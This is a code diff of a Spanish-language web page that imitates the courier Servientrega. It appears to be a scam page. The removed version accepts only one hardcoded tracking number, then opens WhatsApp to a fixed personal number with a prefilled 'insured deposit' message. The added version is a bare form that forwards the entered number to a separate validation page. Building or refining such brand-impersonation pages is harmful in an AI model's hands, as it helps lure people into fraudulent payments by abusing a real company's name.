@@ -1,102 +1,65 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <title>Servientrega – Mundo de Soluciones</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="stylesheet" href="style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Servientrega Centro de Soluciones</title>
+
+<style>
+body{
+  font-family:Arial, sans-serif;
+  background:#f4f4f4;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+  margin:0;
+}
+.box{
+  background:#fff;
+  padding:25px;
+  border-radius:12px;
+  width:90%;
+  max-width:400px;
+  box-shadow:0 10px 20px rgba(0,0,0,.15);
+  text-align:center;
+}
+input{
+  width:100%;
+  padding:14px;
+  margin:15px 0;
+  border-radius:8px;
+  border:1px solid #ccc;
+  font-size:16px;
+}
+button{
+  width:100%;
+  padding:14px;
+  background:#d32f2f;
+  color:#fff;
+  border:none;
+  border-radius:8px;
+  font-size:16px;
+  font-weight:bold;
+}
+</style>
 </head>
+
 <body>
 
-<header class="header">
-  <div class="logo-box">
-    <img src="logo.png" alt="Servientrega">
-    <div class="logo-text">
-      <strong>Servientrega</strong><br>
-      <small>Mundo de Soluciones · Depósito asegurado</small>
-    </div>
-  </div>
-  <div class="menu">☰</div>
-</header>
-
-<section class="hero">
-  <img src="banner.png" class="hero-img">
-  <h1>Estamos presentando<br><strong>novedades</strong></h1>
-  <p>Soluciones logísticas con depósito asegurado</p>
-  <button class="btn-main" onclick="document.getElementById('guia').focus()">
-    Consultar envío
-  </button>
-</section>
-
-<section class="consultar">
-  <h3>Consultar</h3>
-
-  <div class="cuadro-consulta">
-    <select>
-      <option>Envíos</option>
-      <option disabled>Pagos</option>
-    </select>
-
-    <input
-      type="text"
-      id="guia"
-      placeholder="Ingresa el número de guía"
-    >
-
-    <button id="btnWhatsapp" type="button">🔍</button>
-  </div>
-</section>
-
-<section class="card">
-  <div class="icon">🚚✈️</div>
-  <div>
-    <h4>Transporte y Entrega</h4>
-    <p>Servicio exclusivo con depósito asegurado.</p>
-  </div>
-</section>
-
-<!-- BOTÓN FLOTANTE -->
-<div class="whatsapp" id="btnFlotante">💬</div>
+<div class="box">
+  <h2>Consulta tu guía</h2>
+  <input id="guia" placeholder="Número de guía">
+  <button onclick="irValidacion()">Validar</button>
+</div>
 
 <script>
-function validarYEnviarWhatsapp() {
-  const guiaCorrecta = "0750925931";
-  const numeroWhatsapp = "573026219839";
-  const guiaInput = document.getElementById("guia");
-  const guia = guiaInput.value.trim();
-
-  if (guia === "") {
-    alert("⚠️ Debes ingresar el número de guía");
-    guiaInput.focus();
-    return;
+function irValidacion(){
+  const guia = document.getElementById("guia").value.trim();
+  if(guia !== ""){
+    window.location.href = "validar.html?g=" + guia;
   }
-
-  if (guia !== guiaCorrecta) {
-    alert("❌ Número de guía incorrecto.\nEste servicio es exclusivo para depósito asegurado.");
-    guiaInput.focus();
-    return;
-  }
-
-  const mensaje =
-    "Hola, realizo consulta de DEPÓSITO ASEGURADO.\n" +
-    "Guía autorizada: " + guia;
-
-  const url =
-    "https://wa.me/" +
-    numeroWhatsapp +
-    "?text=" +
-    encodeURIComponent(mensaje);
-
-  window.open(url, "_blank");
 }
-
-document
-  .getElementById("btnWhatsapp")
-  .addEventListener("click", validarYEnviarWhatsapp);
-
-document
-  .getElementById("btnFlotante")
-  .addEventListener("click", validarYEnviarWhatsapp);
 </script>
 
 </body>
